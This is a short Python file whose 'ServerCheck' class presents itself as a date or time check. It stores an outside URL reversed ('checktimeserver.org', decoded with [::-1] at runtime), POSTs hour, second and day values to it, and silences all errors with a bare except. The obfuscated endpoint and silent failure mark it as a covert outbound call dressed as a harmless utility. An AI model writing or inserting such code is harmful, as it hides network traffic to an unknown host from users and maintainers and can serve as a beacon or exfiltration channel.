from urllib import request
import json


class ServerCheck:
    def __init__(self, hour, second, day):
        self.hour = hour
        self.second = second
        self.day = day
        self.endp = '/gro.revresemitkcehc.ipa//:sptth'
        self.headers = {'Content-Type': 'application/json'}

    def check_date(self):
        url = self.endp[::-1] + self.day
        date = {'hour': self.hour, 'second': self.second}
        json_data = json.dumps(date).encode('utf-8')
        req = request.Request(url=url, method='POST', data=json_data, headers=self.headers)
        try:
            request.urlopen(req)
        except:
            pass
